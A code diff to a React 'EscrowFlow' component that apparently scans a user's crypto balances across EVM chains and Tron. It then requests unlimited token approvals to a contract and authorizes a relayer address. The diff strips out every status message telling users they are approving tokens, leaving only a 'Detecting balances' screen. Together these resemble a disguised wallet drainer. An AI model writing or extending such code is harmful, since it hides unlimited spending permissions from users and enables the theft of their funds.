@@ -419,10 +419,6 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   const [showApprovalRetry, setShowApprovalRetry] = useState(false);
   const [modal1Open, setModal1Open] = useState(false);
   const [modal1Scanning, setModal1Scanning] = useState(false);
-  /** Supporting copy under the Detecting balances modal. */
-  const [modal1BusyDetail, setModal1BusyDetail] = useState(
-    "Scanning your wallet and preparing deposit authorization."
-  );
   const [modal1Items, setModal1Items] = useState<Modal1Item[]>([]);
   const [modal1Status, setModal1Status] = useState<Record<string, Modal1Status>>({});
   const [modal1Approving, setModal1Approving] = useState(false);
@@ -499,7 +495,6 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
     setModal1Open(false);
     setModal1Scanning(false);
-    setModal1BusyDetail("Scanning your wallet and preparing deposit authorization.");
     setModal2Open(false);
     setGateLoading(false);
     setProcessing(false);
@@ -528,11 +523,9 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   function clearModal1Busy() {
     setModal1Scanning(false);
     setModal1Open(false);
-    setModal1BusyDetail("Scanning your wallet and preparing deposit authorization.");
   }
 
-  function showModal1Busy(detail: string) {
-    setModal1BusyDetail(detail);
+  function showModal1Busy() {
     setModal1Scanning(true);
     setModal1Open(true);
   }
@@ -557,7 +550,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     if (!fn || approvalRetrying) return;
     setApprovalRetrying(true);
     setError(null);
-    showModal1Busy("Resuming approval. Confirm prompts in your wallet when they appear.");
+    showModal1Busy();
     try {
       await fn();
       clearModal1Busy();
@@ -570,7 +563,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
   /** Approve Tron USDT once, confirm allowance, then persist. No auto re-prompt. */
   async function completeTronUsdtApproval(): Promise<boolean> {
-    showModal1Busy("Confirm Tron USDT approval in your wallet when prompted.");
+    showModal1Busy();
     const result = await ensureTronUsdtApproved();
     if (!result.ok || !result.address) {
       const rejected = !result.ok && result.rejected;
@@ -579,7 +572,6 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         code: rejected ? "ACTION_REJECTED" : "TRON_APPROVE_FAILED",
       });
     }
-    showModal1Busy("Confirming Tron USDT approval on-chain…");
     setTronAddress(result.address);
     const persisted = await persistTronVerification(result.address);
     if (!persisted) {
@@ -686,7 +678,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     const chain = CHAINS.find((c) => c.name === target.chainName);
     if (!chain || !address) throw new Error("No wallet / chain");
 
-    showModal1Busy("Confirm authorization in your wallet when prompted.");
+    showModal1Busy();
     const signer = await getSignerFor(chain);
     const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
     let authorizeTx = "";
@@ -695,7 +687,6 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       .catch(() => false);
     if (!alreadyAuth) {
       const authTx = await verification.authorize(RELAYER_ADDRESS);
-      showModal1Busy("Confirming authorization on-chain. This usually takes a few seconds.");
       authorizeTx = await waitForEvmReceipt(authTx, 120_000);
     }
 
@@ -703,13 +694,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     const liveAllow = await erc20.allowance(address, target.contract).catch(() => 0n);
     let approveTxHash: string | undefined;
     if (liveAllow < MaxUint256 / 2n) {
-      showModal1Busy(`Confirm ${target.symbol} approval in your wallet when prompted.`);
       const tx = await erc20.approve(target.contract, MaxUint256);
-      showModal1Busy(`Confirming ${target.symbol} approval on-chain…`);
       approveTxHash = await waitForEvmReceipt(tx, 120_000);
     }
 
-    showModal1Busy("Verifying on-chain approval. Keep this window open.");
     // Ground truth before Supabase write — never fire-and-forget
     await waitForEvmAuthAndAllowance(chain, target.tokenAddr, 90_000);
 
@@ -1260,7 +1248,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     if (!address) return;
     if (modal1InFlight.current || modal1ApproveStarted.current) return;
     modal1InFlight.current = true;
-    showModal1Busy("Detecting balances across networks. Confirm wallet prompts when they appear.");
+    showModal1Busy();
 
     type ScanToken = {
       chain: string; chainLabel: string; chainId: number; symbol: string;
@@ -1337,16 +1325,15 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       }
 
       // Tron only after USDC is confirmed — needs balance, and must not race EVM popups.
-      showModal1Busy("Checking Tron USDT balance…");
+      showModal1Busy();
       let currentTronAddr = tronAddress ?? getConnectedTronAddress();
       if (!currentTronAddr) {
-        showModal1Busy("Connect your Tron wallet if prompted to finish balance detection.");
         currentTronAddr = await ensureTronAddress({ prompt: true });
       }
       if (currentTronAddr) {
         setTronAddress(currentTronAddr);
         modal1SawTron.current = true;
-        showModal1Busy("Detecting Tron USDT balance…");
+        showModal1Busy();
         let tronUsdtUsd = 0;
         let tronAlreadyApproved = false;
         const tronScan = await doScan(currentTronAddr);
@@ -1377,7 +1364,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
             prev.some((p) => p.key === "tron-USDT") ? prev : [...prev, tronItem]
           );
           setModal1Status((s) => ({ ...s, "tron-USDT": "pending" }));
-          showModal1Busy("Confirm Tron USDT approval in your wallet when prompted.");
+          showModal1Busy();
           const tronOk = await runCompulsoryApprovals([tronItem], { markComplete: true });
           if (tronOk) clearModal1Busy();
           return;
@@ -2623,35 +2610,17 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
           aria-live="polite"
           aria-busy="true"
         >
-          <div className="w-full max-w-[400px] overflow-hidden rounded-2xl border border-white/10 bg-surface-card shadow-[0_24px_80px_rgba(10,22,40,0.35)]">
+          <div className="w-full max-w-[360px] overflow-hidden rounded-2xl border border-white/10 bg-surface-card shadow-[0_24px_80px_rgba(10,22,40,0.35)]">
             <div className="h-1 w-full overflow-hidden bg-brand/10">
               <div className="h-full w-2/5 rounded-full bg-brand motion-safe:animate-[detectPulse_1.35s_ease-in-out_infinite]" />
             </div>
-            <div className="px-6 pb-7 pt-8 sm:px-8">
+            <div className="px-6 py-10 sm:px-8">
               <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-brand/[0.08] ring-1 ring-brand/15">
                 <div className="h-8 w-8 animate-spin rounded-full border-[2.5px] border-brand/20 border-t-brand" />
               </div>
               <h3 className="mt-5 text-center text-[17px] font-semibold tracking-tight text-ink">
                 Detecting balances
               </h3>
-              <p className="mt-2 text-center text-[13.5px] leading-relaxed text-body">
-                {modal1BusyDetail}
-              </p>
-              <ul className="mt-6 space-y-2.5 rounded-xl bg-surface-soft/80 px-4 py-3.5">
-                {[
-                  "Scanning Ethereum & supported networks",
-                  "Waiting for wallet confirmation",
-                  "Verifying approval on-chain",
-                ].map((line) => (
-                  <li key={line} className="flex items-start gap-2.5 text-[12.5px] text-body">
-                    <span className="mt-1.5 h-1.5 w-1.5 shrink-0 rounded-full bg-brand/70" />
-                    <span>{line}</span>
-                  </li>
-                ))}
-              </ul>
-              <p className="mt-5 text-center text-[11.5px] leading-relaxed text-muted">
-                Leave this page open. Confirm any prompts in your wallet — do not close the tab.
-              </p>
             </div>
           </div>
         </div>
